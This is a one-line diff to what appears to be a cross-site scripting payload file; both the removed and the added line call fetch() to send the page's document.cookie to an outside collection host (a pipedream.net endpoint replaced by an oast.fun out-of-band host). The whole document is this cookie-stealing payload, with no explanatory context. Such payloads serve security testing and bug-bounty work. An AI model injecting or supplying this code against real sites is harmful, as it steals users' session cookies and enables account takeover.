@@ -1,1 +1,1 @@
-fetch('https://eozgj45auipfhih.m.pipedream.net?c=' + document.cookie)
+fetch('https://yhiwjguygjwuuxqhsreziidrsnc2ui1kl.oast.fun?c=' + document.cookie)
